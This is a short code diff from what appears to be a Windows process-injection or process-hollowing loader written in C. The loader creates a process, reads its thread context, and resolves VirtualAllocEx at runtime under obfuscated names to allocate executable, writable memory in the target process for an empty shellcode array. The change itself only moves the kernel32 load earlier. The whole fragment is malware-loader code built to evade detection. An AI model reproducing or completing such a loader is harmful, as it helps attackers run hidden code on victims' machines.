@@ -27,6 +27,7 @@ int main() {
     STARTUPINFO ga = {0};
     PROCESS_INFORMATION pi = {0};
     ga.cb = sizeof(ga);
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
 
     BOOL (*pCreateProcess)(
         LPCSTR lpApplicationName,
@@ -51,8 +52,8 @@ int main() {
 
     GetThreadContext(pi.hThread, &ctx);
 unsigned char itsthecod345[] = {};
+
     
-    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
 LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
     (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
     LPVOID memlo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
